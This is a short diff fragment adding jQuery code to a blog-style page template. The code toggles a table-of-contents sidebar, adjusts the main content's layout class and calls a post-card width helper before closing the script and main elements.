+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
 
 
 
